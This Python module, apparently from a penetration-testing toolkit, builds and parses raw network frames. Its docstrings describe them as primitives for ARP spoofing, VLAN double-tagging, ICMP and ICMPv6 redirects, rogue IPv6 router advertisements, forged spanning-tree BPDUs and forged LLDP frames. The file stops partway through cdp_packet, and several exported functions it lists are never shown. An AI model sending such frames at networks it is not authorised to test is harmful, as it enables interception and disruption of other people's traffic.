"""The network stack, frame by frame: Ethernet, ARP, IP, TCP, UDP, ICMP, ICMPv6, L2.

Half of what a wireless assessment finds is not on the wireless side at all.  Once a
tester is associated, the interesting attacks are the ones every wired assessment has
always used — DHCP starvation, a rogue DHCP server, a SYN flood, forged DHCP RELEASEs,
router-advertisement spoofing, LLMNR/NBNS answer spoofing, spanning-tree root election —
and every one of them is a *frame*, built to a standard, sent to a switch port or a
radio.  That is what this module is: the real encodings, with the checksums computed and
the lengths filled in, so an attack can be a frame rather than a description of one.

Layouts implemented here, all from the standards rather than from memory:

* **Ethernet II**, including **802.1Q VLAN tags** (a doubly-tagged frame is the classic
  VLAN-hopping primitive: the switch's access port strips the outer tag, the core switch
  forwards on the inner one).
* **ARP** (RFC 826) and a gratuitous/unsolicited variant.
* **IPv4** (RFC 791) with a real header checksum, **TCP** (RFC 793) with the pseudo-header
  checksum, **UDP** (RFC 768) with the same.
* **ICMP** (RFC 792): echo, destination-unreachable with its code field, and redirect —
  the one an attacker uses to rewrite a host's route table with a single packet.
* **ICMPv6** (RFC 4443, 4861, 4862): router advertisement with prefix information (what
  SLAAC believes), neighbour solicitation and advertisement (what address resolution
  believes), and redirect.
* **Spanning Tree BPDUs** (802.1D): a configuration BPDU with a root identifier and a
  bridge identifier — sending one with a better bridge ID is how a tester becomes the
  root of somebody's network.
* **LLDP** and **CDP**: the neighbour-discovery frames that populate a switch's topology
  map, which is why a forged one is how an attacker appears as a "switch" to the network
  management system.
* **DNS answers**, **LLMNR**, **NBNS** and **mDNS**: the four name-resolution protocols
  that answer a question with whichever reply arrives first.
* **MQTT** (CONNECT/SUBSCRIBE/PUBLISH, with the variable-length remaining-length encoding
  that trips up naive implementations), **RTSP** (the DESCRIBE an IP camera answers
  unauthenticated far too often), **PJL** (the printer job language whose ``FSUPLOAD``
  hands over files) and **TELNET** option negotiation.
"""

from __future__ import annotations

import os
import struct
from typing import Any, Dict, List, Sequence, Tuple

from .netproto import (checksum, encode_name, ipv4_bytes, ipv4_text, mac_to_bytes,
                       bytes_to_mac)

__all__ = [
    "ethertype_of", "ethernet_frame", "vlan_tag", "parse_ethernet", "ETHERTYPES",
    "arp_packet", "arp_reply", "gratuitous_arp", "ipv4_header", "ipv4_packet",
    "udp_packet", "tcp_packet", "tcp_flags", "parse_ipv4_header", "parse_udp_packet",
    "icmp_echo", "icmp_unreachable", "icmp_redirect", "parse_icmp",
    "ICMP_UNREACHABLE_CODES", "icmpv6_router_advertisement", "icmpv6_router_solicitation",
    "icmpv6_neighbor_solicitation", "icmpv6_neighbor_advertisement", "icmpv6_redirect",
    "parse_icmpv6", "ipv6_packet", "ipv6_address", "IPV6_MULTICAST_ALL_ROUTERS",
    "IPV6_MULTICAST_ALL_NODES", "IPV6_MULTICAST_SOLICITED",
    "stp_configuration_bpdu", "stp_frame", "parse_bpdu", "STP_MULTICAST",
    "BRIDGE_PRIORITY_DEFAULT", "BPDU_OFFSETS",
    "lldp_packet", "cdp_packet", "parse_lldp", "lldp_tlv",
    "llmnr_query", "llmnr_response", "nbns_query", "nbns_response", "mdns_query",
    "mdns_response", "parse_llmnr", "LLMNR_PORT", "MDNS_PORT", "NBNS_PORT",
    "mqtt_connect", "mqtt_subscribe", "mqtt_publish", "mqtt_packet", "mqtt_varlen",
    "parse_mqtt", "rtsp_request", "parse_rtsp", "pjl_command", "PJL_FILESYSTEM",
    "telnet_negotiation", "TELNET_OPTIONS",
    "DHCP_RELEASE", "DHCP_DECLINE", "DHCP_INFORM", "DHCP_FLOOD_MACS",
    ]

# --------------------------------------------------------------------------- #
# Ethernet
# --------------------------------------------------------------------------- #

ETHERTYPES = {0x0800: "IPv4", 0x0806: "ARP", 0x8035: "RARP", 0x86DD: "IPv6",
              0x8100: "802.1Q VLAN", 0x88CC: "LLDP", 0x2000: "CDP", 0x8847: "MPLS",
              0x888E: "EAPOL", 0x8863: "PPPoE discovery", 0x8864: "PPPoE session",
              0x0842: "WAKE-ON-LAN", 0x88A8: "802.1ad (QinQ)", 0x88F7: "PTP"}

BROADCAST = "ff:ff:ff:ff:ff:ff"


def ethertype_of(name: str) -> int:
    """``ethertype_of("IPv4")`` -> ``0x0800`` (so a builder can take a name)."""
    for code, label in ETHERTYPES.items():
        if label.lower().startswith(name.lower()):
            return code
    try:
        return int(name, 0)
    except (TypeError, ValueError):
        return 0x0800


def ethernet_frame(destination: str, source: str, payload: bytes,
                   kind: int = 0x0800) -> bytes:
    """An Ethernet II frame: destination, source, ethertype, payload."""
    return mac_to_bytes(destination) + mac_to_bytes(source) \
        + struct.pack(">H", kind & 0xFFFF) + bytes(payload)


def vlan_tag(vlan_id: int, priority: int = 0, inner: int = 0x0800,
             dei: bool = False) -> bytes:
    """An 802.1Q tag: 2 bytes of TCI (PCP/DEI/VID) then the inner ethertype.

    Two of these in a row is the museum piece known as double tagging: an access port
    that accepts it strips the first tag and forwards the frame on the *inner* VLAN,
    which is a VLAN it never allowed the sender to join.
    """
    tci = ((priority & 0x07) << 13) | (0x1000 if dei else 0) | (vlan_id & 0x0FFF)
    return struct.pack(">HH", tci, inner & 0xFFFF)


def parse_ethernet(frame: bytes) -> Dict[str, Any]:
    """Read an Ethernet II frame, unwrapping any VLAN tags it carries."""
    out: Dict[str, Any] = {"length": len(frame)}
    if len(frame) < 14:
        return out
    out["destination"] = bytes_to_mac(frame[:6])
    out["source"] = bytes_to_mac(frame[6:12])
    kind = int.from_bytes(frame[12:14], "big")
    offset = 14
    vlans: List[int] = []
    while kind in (0x8100, 0x88A8) and len(frame) >= offset + 4:
        tci = int.from_bytes(frame[offset:offset + 2], "big")
        vlans.append(tci & 0x0FFF)
        kind = int.from_bytes(frame[offset + 2:offset + 4], "big")
        offset += 4
    out["vlans"] = vlans
    out["ethertype"] = kind
    out["kind"] = ETHERTYPES.get(kind, f"0x{kind:04x}")
    out["payload"] = frame[offset:]
    return out


# --------------------------------------------------------------------------- #
# ARP
# --------------------------------------------------------------------------- #

def arp_packet(operation: int, sender_mac: str, sender_ip: str, target_mac: str,
               target_ip: str) -> bytes:
    """ARP over Ethernet (RFC 826): 28 bytes, hardware type 1, protocol 0x0800."""
    return (struct.pack(">HHBBH", 1, 0x0800, 6, 4, operation)
            + mac_to_bytes(sender_mac) + ipv4_bytes(sender_ip)
            + mac_to_bytes(target_mac) + ipv4_bytes(target_ip))


def arp_reply(sender_mac: str, sender_ip: str, target_mac: str, target_ip: str) -> bytes:
    return arp_packet(2, sender_mac, sender_ip, target_mac, target_ip)


def gratuitous_arp(mac: str, ip: str, announcement: bool = True) -> bytes:
    """A gratuitous ARP: sender and target are the same address.

    An *announcement* (a request) tells the segment the address is now here; a *reply*
    updates every cache that receives it.  Both are how an ARP spoofing tool works, and
    both are one frame.
    """
    return arp_packet(1 if announcement else 2, mac, ip,
                      "00:00:00:00:00:00" if announcement else BROADCAST, ip)


# --------------------------------------------------------------------------- #
# IPv4, UDP, TCP
# --------------------------------------------------------------------------- #

def ipv4_header(source: str, destination: str, protocol: int, payload_length: int,
                ttl: int = 64, identification: int = 0, dscp: int = 0,
                dont_fragment: bool = False, options: bytes = b"") -> bytes:
    """An IPv4 header with a correct header checksum (RFC 791)."""
    header_length = 20 + len(options)
    flags_offset = 0x4000 if dont_fragment else 0        # DF bit; fragment offset 0
    body = struct.pack(">BBHHHBBH", 0x45 | (dscp << 2), 0,
                       header_length + payload_length, identification or os.urandom(1)[0] * 251,
                       flags_offset, ttl, protocol, 0)
    body += ipv4_bytes(source) + ipv4_bytes(destination) + bytes(options)
    return body[:10] + struct.pack(">H", checksum(body)) + body[12:]


def ipv4_packet(source: str, destination: str, protocol: int, payload: bytes,
                ttl: int = 64, identification: int = 0, dscp: int = 0,
                dont_fragment: bool = False, options: bytes = b"") -> bytes:
    """An IPv4 packet: header (checksummed) plus the payload it was given."""
    return ipv4_header(source, destination, protocol, len(payload), ttl=ttl,
                       identification=identification, dscp=dscp,
                       dont_fragment=dont_fragment, options=options) + bytes(payload)


def _transport_checksum(source: str, destination: str, protocol: int,
                        segment: bytes) -> int:
    """The TCP/UDP checksum: a pseudo-header, then the segment (RFC 793 §3.1)."""
    pseudo = ipv4_bytes(source) + ipv4_bytes(destination) + struct.pack(">BBH", 0,
                                                                       protocol, len(segment))
    return checksum(pseudo + segment)


def udp_packet(source: str, destination: str, source_port: int, dest_port: int,
               payload: bytes, checksum_or_zero: bool = True) -> bytes:
    """A UDP datagram with its checksum over the IPv4 pseudo-header."""
    length = 8 + len(payload)
    segment = struct.pack(">HHHH", source_port, dest_port, length, 0) + bytes(payload)
    if not checksum_or_zero:
        return segment
    value = _transport_checksum(source, destination, 17, segment) or 0xFFFF
    return segment[:6] + struct.pack(">H", value) + segment[8:]


def tcp_flags(fin: bool = False, syn: bool = False, rst: bool = False, psh: bool = False,
              ack: bool = False, urg: bool = False, ece: bool = False,
              cwr: bool = False) -> int:
    """The TCP flags byte as a number (``syn=True`` alone is a SYN packet)."""
    value = 0
    for bit, on in ((0x01, fin), (0x02, syn), (0x04, rst), (0x08, psh), (0x10, ack),
                    (0x20, urg), (0x40, ece), (0x80, cwr)):
        if on:
            value |= bit
    return value


def tcp_packet(source: str, destination: str, source_port: int, dest_port: int,
               sequence: int = 0, acknowledgement: int = 0, flags: int = 0x02,
               window: int = 64240, payload: bytes = b"", urgent: int = 0,
               options: bytes = b"") -> bytes:
    """A TCP segment, checksummed against the pseudo-header."""
    offset = (5 + len(options) // 4) << 4
    header = struct.pack(">HHIIBBHHH", source_port, dest_port, sequence & 0xFFFFFFFF,
                         acknowledgement & 0xFFFFFFFF, offset, flags & 0xFF,
                         window & 0xFFFF, 0, urgent & 0xFFFF)
    segment = header + bytes(options) + bytes(payload)
    value = _transport_checksum(source, destination, 6, segment) or 0xFFFF
    return segment[:16] + struct.pack(">H", value) + segment[18:]


def parse_ipv4_header(packet: bytes) -> Dict[str, Any]:
    """Read an IPv4 header without needing the payload to be understood."""
    if len(packet) < 20 or (packet[0] >> 4) != 4:
        return {}
    header_length = (packet[0] & 0x0F) * 4
    protocol = packet[9]
    return {"version": 4, "header_length": header_length,
            "total_length": int.from_bytes(packet[2:4], "big"),
            "identification": int.from_bytes(packet[4:6], "big"),
            "dont_fragment": bool(packet[6] & 0x40),
            "fragment_offset": int.from_bytes(packet[6:8], "big") & 0x1FFF,
            "ttl": packet[8], "protocol": protocol,
            "protocol_name": {1: "ICMP", 6: "TCP", 17: "UDP", 47: "GRE", 58: "ICMPv6",
                              89: "OSPF", 112: "VRRP"}.get(protocol, str(protocol)),
            "source": ipv4_text(packet[12:16]), "destination": ipv4_text(packet[16:20]),
            "payload": packet[header_length:]}


def parse_udp_packet(segment: bytes) -> Dict[str, Any]:
    if len(segment) < 8:
        return {}
    source, destination, length, _checksum = struct.unpack(">HHHH", segment[:8])
    return {"source_port": source, "dest_port": destination, "length": length,
            "payload": segment[8:]}


# --------------------------------------------------------------------------- #
# ICMP and ICMPv6
# --------------------------------------------------------------------------- #

#: the code field of a destination-unreachable message decides what it *means*: a
#: "administratively prohibited" is a firewall, a "fragmentation needed" rewrites a
#: host's path MTU, and "host unreachable" is how a route gets withdrawn
ICMP_UNREACHABLE_CODES = {0: "network unreachable", 1: "host unreachable",
                          2: "protocol unreachable", 3: "port unreachable",
                          4: "fragmentation needed but DF set", 5: "source route failed",
                          6: "destination network unknown", 7: "destination host unknown",
                          9: "network administratively prohibited",
                          10: "host administratively prohibited",
                          13: "communication administratively filtered",
                          15: "precedence cutoff in effect"}


def icmp_echo(identifier: int = 0x1234, sequence: int = 1, payload: bytes = b"",
              reply: bool = False) -> bytes:
    """ICMP echo request (type 8) or reply (type 0), with its checksum."""
    body = bytes([0 if reply else 8, 0]) + struct.pack(">HHH", 0, identifier, sequence)
    packet = body + bytes(payload)
    return packet[:2] + struct.pack(">H", checksum(packet)) + packet[4:]


def icmp_unreachable(code: int = 3, original: bytes = b"") -> bytes:
    """ICMP destination unreachable (type 3) carrying the packet that caused it."""
    body = bytes([3, code & 0xFF]) + struct.pack(">HI", 0, 0) + bytes(original)[:28]
    return body[:2] + struct.pack(">H", checksum(body)) + body[4:]


def icmp_redirect(gateway: str, original: bytes = b"", code: int = 1) -> bytes:
    """ICMP redirect (type 5, code 1 = redirect for host).

    It tells the receiver "send this destination via that gateway instead" — a single
    frame that rewrites a routing decision, and the reason hosts are supposed to accept
    redirects only from the router they already trust.
    """
    body = bytes([5, code & 0xFF]) + struct.pack(">H", 0) \
        + ipv4_bytes(gateway) + bytes(original)[:28]
    return body[:2] + struct.pack(">H", checksum(body)) + body[4:]


def parse_icmp(data: bytes) -> Dict[str, Any]:
    """Type, code and the interesting fields of an ICMP message."""
    if len(data) < 4:
        return {}
    kind, code = data[0], data[1]
    out: Dict[str, Any] = {"type": kind, "code": code,
                           "type_name": {0: "echo reply", 3: "destination unreachable",
                                         4: "source quench", 5: "redirect",
                                         8: "echo request", 9: "router advertisement",
                                         10: "router solicitation", 11: "time exceeded",
                                         12: "parameter problem",
                                         13: "timestamp request",
                                         14: "timestamp reply"}.get(kind, str(kind))}
    if kind in (0, 8) and len(data) >= 8:
        out["identifier"] = int.from_bytes(data[4:6], "big")
        out["sequence"] = int.from_bytes(data[6:8], "big")
        out["payload_length"] = max(0, len(data) - 8)
    if kind == 3 and len(data) >= 8:
        out["code_text"] = ICMP_UNREACHABLE_CODES.get(code, "")
        out["quoted"] = data[8:8 + 28]
    if kind == 5 and len(data) >= 8:
        out["gateway"] = ipv4_text(data[4:8])
        out["quoted"] = data[8:8 + 28]
    return out


# --------------------------------------------------------------------------- #
# IPv6 and ICMPv6
# --------------------------------------------------------------------------- #

IPV6_MULTICAST_ALL_NODES = "ff02::1"
IPV6_MULTICAST_ALL_ROUTERS = "ff02::2"
IPV6_MULTICAST_SOLICITED = "ff02::1:ff"


def ipv6_address(address: str) -> bytes:
    """16 bytes from an IPv6 text address (``::`` expansion included, no library)."""
    address = (address or "").split("%")[0]
    if not address:
        return bytes(16)
    if "::" in address:
        head, _, tail = address.partition("::")
        head_parts = [part for part in head.split(":") if part]
        tail_parts = [part for part in tail.split(":") if part]
        missing = 8 - len(head_parts) - len(tail_parts)
        parts = head_parts + ["0"] * max(0, missing) + tail_parts
    else:
        parts = [part for part in address.split(":") if part]
    out = bytearray()
    for part in parts[:8]:
        try:
            out += struct.pack(">H", int(part, 16))
        except ValueError:
            out += b"\x00\x00"
    return bytes(out[:16]).ljust(16, b"\x00")


def ipv6_text(raw: bytes) -> str:
    return ":".join(f"{int.from_bytes(raw[index:index + 2], 'big'):x}"
                    for index in range(0, 16, 2))


def ipv6_packet(source: str, destination: str, next_header: int, payload: bytes,
                hop_limit: int = 255, traffic_class: int = 0, flow_label: int = 0) -> bytes:
    """An IPv6 header (40 bytes, RFC 8200) plus its payload."""
    first = (6 << 28) | ((traffic_class & 0xFF) << 20) | (flow_label & 0xFFFFF)
    header = struct.pack(">IHBB", first, len(payload), next_header, hop_limit)
    return header + ipv6_address(source) + ipv6_address(destination) + bytes(payload)


def _icmpv6(kind: int, code: int, body: bytes, source: str = "fe80::1",
            destination: str = "ff02::1") -> bytes:
    """An ICMPv6 message with the checksum taken over its IPv6 pseudo-header."""
    message = bytes([kind, code, 0, 0]) + bytes(body)
    pseudo = ipv6_address(source) + ipv6_address(destination) \
        + struct.pack(">I", len(message)) + b"\x00\x00\x00\x3a"
    value = checksum(pseudo + message) or 0xFFFF
    return bytes([kind, code]) + struct.pack(">H", value) + bytes(body)


def icmpv6_router_advertisement(router: str = "fe80::1", prefix: str = "2001:db8:1::",
                                prefix_length: int = 64, lifetime: int = 1800,
                                valid_lifetime: int = 86400, managed: bool = False,
                                other: bool = False, source: str = "fe80::1",
                                destination: str = IPV6_MULTICAST_ALL_NODES,
                                mtu: int = 1500, reachable_ms: int = 30000,
                                retrans_ms: int = 1000, dns: Sequence[str] = ()) -> bytes:
    """An ICMPv6 Router Advertisement (type 134) with its prefix information option.

    A host that receives one is being told, by whoever sent it, what its default
    gateway is, what prefix it should configure itself from (SLAAC), and — through the
    RDNSS option — which resolver to trust.  It is the IPv6 equivalent of a rogue DHCP
    server, and it needs no authentication at all.
    """
    flags = (0x80 if managed else 0) | (0x40 if other else 0)     # M and O bits
    body = bytes([64, flags]) + struct.pack(">HHHI", lifetime, reachable_ms, retrans_ms, 0)
    # prefix information option (type 3, 32 bytes): prefix, length, flags, lifetimes
    body += bytes([3, 4, prefix_length, 0xC0])                    # on-link + autonomous
    body += struct.pack(">III", valid_lifetime, 0, 0)
    body += ipv6_address(prefix)[:16]
    # MTU option (type 5) and RDNSS option (type 25)
    body += bytes([5, 1]) + struct.pack(">HI", 0, mtu)
    for server in dns:
        body += bytes([25, 3]) + struct.pack(">HI", 0, lifetime) + ipv6_address(server)
    return _icmpv6(134, 0, body, source=source, destination=destination)


def icmpv6_router_solicitation(source: str = "fe80::1", target: str = IPV6_MULTICAST_ALL_ROUTERS
                               ) -> bytes:
    """An ICMPv6 Router Solicitation (type 133): "routers, announce yourselves"."""
    body = struct.pack(">I", 0)                 # reserved
    body += bytes([1, 1]) + ipv6_address(source)  # source link-layer address option
    return _icmpv6(133, 0, body, source=source, destination=target)


def ipv6_multicast_mac(address: str) -> str:
    """The Ethernet address an IPv6 multicast group maps to (33:33: + the low 32 bits).

    A frame for ``ff02::1`` goes to ``33:33:00:00:00:01`` — which is why a rogue
    router advertisement is addressed to the first three bytes every IPv6 host listens
    on, and why a switch cannot filter it by group membership alone.
    """
    raw = ipv6_address(address)
    return "33:33:" + ":".join(f"{byte:02x}" for byte in raw[-4:])


def solicited_node_multicast(address: str) -> str:
    """The solicited-node multicast address of an IPv6 address (RFC 4291, 2.7.1).

    Only the low 24 bits are used, so ``2001:db8::5`` maps to ``ff02::1:ff00:5`` — a
    neighbour solicitation goes to this address rather than to all nodes, which is why a
    host that is not the target generally does not see it.
    """
    raw = ipv6_address(address)
    return f"ff02::1:ff{raw[-3]:02x}:{int.from_bytes(raw[-2:], 'big'):x}"


def icmpv6_neighbor_solicitation(source: str, target: str,
                                 source_mac: str = "") -> bytes:
    """An ICMPv6 Neighbour Solicitation (type 135) for an address on the same link."""
    body = struct.pack(">I", 0) + ipv6_address(target)
    if source_mac:
        body += bytes([1, 1]) + mac_to_bytes(source_mac)
    # the destination is the solicited-node multicast address of the target
    raw = ipv6_address(target)
    # ff02::1:ffXX:XXXX — the low 24 bits of the target, in the last two groups
    destination = f"ff02::1:ff{raw[13]:02x}:{raw[14]:02x}{raw[15]:02x}"
    return _icmpv6(135, 0, body, source=source, destination=destination)


def icmpv6_neighbor_advertisement(source: str, target: str, source_mac: str = "",
                                  router: bool = False, solicited: bool = True,
                                  override: bool = True) -> bytes:
    """An ICMPv6 Neighbour Advertisement (type 136) — unsolicited ones are the spoof."""
    flags = (0x80 if router else 0) | (0x40 if solicited else 0) | (0x20 if override else 0)
    body = struct.pack(">I", flags) + ipv6_address(target)
    if source_mac:
        body += bytes([2, 1]) + mac_to_bytes(source_mac)
    raw = ipv6_address(target)
    destination = (f"ff02::1:ff{raw[13]:02x}:{raw[14]:02x}{raw[15]:02x}"
                   if solicited else IPV6_MULTICAST_ALL_NODES)
    return _icmpv6(136, 0, body, source=source, destination=destination)


def icmpv6_redirect(target: str, destination: str, gateway: str,
                    source: str = "fe80::1") -> bytes:
    """An ICMPv6 Redirect (type 137): "reach that destination through that gateway"."""
    body = struct.pack(">I", 0) + ipv6_address(target) + ipv6_address(destination)
    body += bytes([2, 1]) + mac_to_bytes("00:00:00:00:00:00")
    return _icmpv6(137, 0, body, source=source, destination=gateway)


def parse_icmpv6(data: bytes) -> Dict[str, Any]:
    """Type, code and option list of an ICMPv6 message."""
    if len(data) < 4:
        return {}
    kind, code = data[0], data[1]
    out: Dict[str, Any] = {"type": kind, "code": code,
                           "type_name": {1: "destination unreachable", 2: "packet too big",
                                         3: "time exceeded", 4: "parameter problem",
                                         128: "echo request", 129: "echo reply",
                                         133: "router solicitation",
                                         134: "router advertisement",
                                         135: "neighbour solicitation",
                                         136: "neighbour advertisement",
                                         137: "redirect"}.get(kind, str(kind))}
    body = data[4:]
    if kind == 134 and len(body) >= 12:
        out["hop_limit"] = body[0]
        out["managed"] = bool(body[1] & 0x80)
        out["other"] = bool(body[1] & 0x40)
        out["lifetime"] = int.from_bytes(body[2:4], "big")
        options: List[Dict[str, Any]] = []
        offset = 12
        while offset + 2 <= len(body):
            option_type = body[offset]
            units = body[offset + 1]
            length = max(1, units) * 8
            if offset + length > len(body):
                break
            option = {"type": option_type, "length": length}
            if option_type == 3 and length >= 32:
                option["prefix"] = ipv6_text(body[offset + 16:offset + 32])
                option["prefix_length"] = body[offset + 2]
                option["on_link"] = bool(body[offset + 2 + 1] & 0x80)
                option["autonomous"] = bool(body[offset + 2 + 1] & 0x40)
            elif option_type == 5 and length >= 8:
                option["mtu"] = int.from_bytes(body[offset + 4:offset + 8], "big")
            elif option_type == 25 and length >= 24:
                option["dns"] = ipv6_text(body[offset + 8:offset + 24])
            options.append(option)
            offset += length
        out["options"] = options
    elif kind in (135, 136) and len(body) >= 20:
        out["target"] = ipv6_text(body[4:20])
        if kind == 136:
            # the flags are the whole first word — ``R S O`` are the low three bits of
            # the last byte, and the reserved 29 bits sit above them
            flags = int.from_bytes(body[0:4], "big")
            out["router"] = bool(flags & 0x80)
            out["solicited"] = bool(flags & 0x40)
            out["override"] = bool(flags & 0x20)
        # the options carry the layer-2 claim: a *source* link-layer option on a
        # solicitation, a *target* one on an advertisement.  It is the whole finding —
        # "this MAC says it is that address" — so it has to be read, not skipped.
        offset = 20
        while offset + 8 <= len(body):
            option_type, units = body[offset], body[offset + 1]
            length = max(1, units) * 8
            if offset + length > len(body):
                break
            if option_type == 1:
                out["source_mac"] = bytes_to_mac(body[offset + 2:offset + 8])
            elif option_type == 2:
                out["target_mac"] = bytes_to_mac(body[offset + 2:offset + 8])
            offset += length
    return out


# --------------------------------------------------------------------------- #
# Spanning tree, LLDP and CDP: the frames that own the topology
# --------------------------------------------------------------------------- #

#: the default bridge priority: 0x8000.  A forged BPDU with a *lower* bridge id wins
#: the root election, which is how one frame can re-topologise a network.
BRIDGE_PRIORITY_DEFAULT = 0x8000


def stp_configuration_bpdu(root_id: str, bridge_id: str, root_path_cost: int = 0,
                           port_id: int = 0x8001, root_priority: int = 0,
                           bridge_priority: int = 0, max_age: float = 20.0,
                           hello_time: float = 2.0, forward_delay: float = 15.0,
                           top_change: bool = False, topology_change_ack: bool = False
                           ) -> bytes:
    """An 802.1D Configuration BPDU.

    ``root_id`` and ``bridge_id`` are 8-byte values: two bytes of priority and six of
    MAC.  A BPDU claiming a better (lower) bridge id than the real switch's becomes the
    root of the spanning tree, and everything then forwards through it.
    """

    def bridge(priority: int, address: str) -> bytes:
        return struct.pack(">H", priority & 0xFFFF) + mac_to_bytes(address)

    flags = (0x01 if top_change else 0) | (0x80 if topology_change_ack else 0)
    # 802.1D configuration BPDU, field by field (35 bytes in total):
    #   protocol id (2) | version (1) | type (1) | flags (1)
    #   root identifier (8) | root path cost (4) | bridge identifier (8)
    #   port identifier (2) | message age (2) | max age (2) | hello (2) | forward (2)
    body = struct.pack(">HBBB", 0x0000, 0x00, 0x00, flags)       # id, version, type, flags
    body += bridge(root_priority, root_id)                        # root identifier
    body += struct.pack(">I", root_path_cost)                     # root path cost
    body += bridge(bridge_priority or BRIDGE_PRIORITY_DEFAULT, bridge_id)
    body += struct.pack(">H", port_id)                            # port identifier
    body += struct.pack(">H", 0)                                  # message age
    body += struct.pack(">HHH", int(max_age * 256), int(hello_time * 256),
                        int(forward_delay * 256))
    assert len(body) == 35, f"a configuration BPDU is 35 bytes, this is {len(body)}"
    # LLC/SNAP header: a BPDU rides in an 802.3 frame (DSAP/SSAP 0x42, control 0x03,
    # SNAP OUI 00:00:00, PID 0x0000), which is five bytes after the LLC header
    return b"\x42\x42\x03" + b"\x00\x00\x00" + b"\x00\x00" + body


#: the multicast address every bridge listens to: STP BPDUs go nowhere else
STP_MULTICAST = "01:80:c2:00:00:00"


def stp_frame(root_id: str, bridge_id: str, source_mac: str = "", **kwargs: Any) -> bytes:
    """A complete 802.3 STP frame, ready to hand to a raw socket.

    An 802.3 frame carries a *length* where Ethernet II carries an ethertype, and the
    length counts the LLC payload: that is why a forged BPDU is 38 bytes of payload and
    a two-byte length of 0x0026, not an ethertype of anything.
    """
    llc = stp_configuration_bpdu(root_id, bridge_id, **kwargs)
    source = source_mac or bridge_id
    return mac_to_bytes(STP_MULTICAST) + mac_to_bytes(source) \
        + struct.pack(">H", len(llc)) + llc


#: the 802.1D configuration BPDU field offsets, counted from the start of the BPDU:
#: protocol id (0), version (2), type (3), flags (4), root identifier (5, eight bytes),
#: root path cost (13, four), bridge identifier (17, eight), port identifier (25, two),
#: message age (27), max age (29), hello time (31), forward delay (33) — 35 bytes total
BPDU_OFFSETS = {"version": 2, "type": 3, "flags": 4, "root": 5, "cost": 13,
                "bridge": 17, "port": 25, "message_age": 27, "max_age": 29,
                "hello": 31, "forward_delay": 33}


def parse_bpdu(data: bytes) -> Dict[str, Any]:
    """Read the fields of a configuration BPDU.

    Accepts the BPDU on its own, one behind an LLC/SNAP header (which is how it looks
    after an 802.3 frame has been unwrapped), and one with a two-byte length in front of
    that, because all three shapes turn up depending on how far the capture was
    dissected before it reached here.
    """
    # find the BPDU: either it starts the buffer, or it follows an LLC/SNAP header
    # (which itself may sit behind an 802.3 length field and a MAC header)
    offset = -1
    for candidate in (0, 8, 10, 14, 22):
        if len(data) < candidate + 35:
            continue
        head = data[candidate:candidate + 4]
        if head[:2] == b"\x00\x00" and head[2] in (0, 1, 2, 3):
            offset = candidate
            break
    if offset < 0 or len(data) < offset + 35:
        return {}
    body = data[offset:offset + 35]
    out: Dict[str, Any] = {"protocol_version": body[2], "bpdu_type": body[3],
                           "flags": body[4],
                           "root_path_cost": int.from_bytes(body[13:17], "big"),
                           "port_id": int.from_bytes(body[25:27], "big"),
                           "message_age": int.from_bytes(body[27:29], "big") / 256.0,
                           "max_age": int.from_bytes(body[29:31], "big") / 256.0,
                           "hello_time": int.from_bytes(body[31:33], "big") / 256.0,
                           "forward_delay": int.from_bytes(body[33:35], "big") / 256.0}
    out["root_priority"] = int.from_bytes(body[5:7], "big")
    out["root_id"] = bytes_to_mac(body[7:13])
    out["root_id_full"] = f"{out['root_priority']:04x}.{body[7:13].hex()}"
    out["bridge_priority"] = int.from_bytes(body[17:19], "big")
    out["bridge_id"] = bytes_to_mac(body[19:25])
    out["bridge_id_full"] = f"{out['bridge_priority']:04x}.{body[19:25].hex()}"
    return out


def lldp_tlv(tlv_type: int, value: bytes) -> bytes:
    """One LLDP TLV: 7 bits of type, 9 bits of length, then the value."""
    header = ((tlv_type & 0x7F) << 9) | (len(value) & 0x1FF)
    return struct.pack(">H", header) + bytes(value)


LLDP_CHASSIS_ID, LLDP_PORT_ID, LLDP_TTL, LLDP_SYSTEM_NAME, LLDP_MANAGEMENT_ADDRESS = (
    1, 2, 3, 5, 8)


def lldp_packet(chassis_mac: str = "aa:bb:cc:dd:ee:01", port: str = "eth0",
                system_name: str = "core-switch", ttl: int = 120,
                management_ip: str = "", capabilities: int = 0x14) -> bytes:
    """An LLDP frame: a switch's own topology advertisement, and a forgery target.

    Subtypes matter: 4 is a MAC address, 5 a network address.  A forged LLDP frame put
    an attacker into the switch's neighbour table as a "switch" or a "router", which is
    how a network management system comes to trust it.
    """
    body = lldp_tlv(LLDP_CHASSIS_ID, bytes([4]) + mac_to_bytes(chassis_mac))
    body += lldp_tlv(LLDP_PORT_ID, bytes([5]) + port.encode()[:24])
    body += lldp_tlv(LLDP_TTL, struct.pack(">H", ttl))
    body += lldp_tlv(LLDP_SYSTEM_NAME, system_name.encode()[:32])
    if management_ip:
        body += lldp_tlv(LLDP_MANAGEMENT_ADDRESS,
                         bytes([1, 1]) + ipv4_bytes(management_ip))
    body += lldp_tlv(7, bytes([capabilities]))                   # system capabilities
    body += lldp_tlv(0, b"")                                     # end of LLDPDU
    return ethernet_frame("01:80:c2:00:00:0e", chassis_mac, body, 0x88CC)


def parse_lldp(data: bytes) -> Dict[str, Any]:
    """Read an LLDP frame's TLVs."""
    out: Dict[str, Any] = {"tlvs": []}
    offset = 0
    while offset + 2 <= len(data):
        header = int.from_bytes(data[offset:offset + 2], "big")
        tlv_type = header >> 9
        length = header & 0x1FF
        value = data[offset + 2:offset + 2 + length]
        if len(value) < length:
            break
        entry: Dict[str, Any] = {"type": tlv_type, "length": length}
        if tlv_type == LLDP_CHASSIS_ID and value:
            entry["subtype"] = value[0]
            entry["value"] = (bytes_to_mac(value[1:7]) if value[0] == 4
                              else value[1:].decode("latin-1", "replace"))
        elif tlv_type == LLDP_PORT_ID and value:
            entry["value"] = (bytes_to_mac(value[1:7]) if value[0] == 3
                              else value[1:].decode("latin-1", "replace"))
        elif tlv_type == LLDP_TTL and len(value) >= 2:
            out["ttl"] = int.from_bytes(value[:2], "big")
        elif tlv_type == LLDP_SYSTEM_NAME:
            out["system_name"] = value.decode("latin-1", "replace").strip("\x00")
        elif tlv_type == LLDP_MANAGEMENT_ADDRESS and len(value) >= 5:
            out["management_address"] = ipv4_text(value[2:6])
        elif tlv_type == 0:
            break
        out["tlvs"].append(entry)
        offset += 2 + length
    return out


def cdp_packet(device_id: str = "core-switch", platform: str = "cisco WS-C3750",
               address: str = "", port: str = "GigabitEthernet0/1", version: str = "12.2",
               capabilities: int = 0x00000001) -> bytes:
    """A CDP frame (Cisco's predecessor to LLDP): 802.3 with SNAP 0x2000."""
    def tlv(kind: int, value: bytes) -> bytes:
        return struct.pack(">HH", kind, len(value) + 4) + value

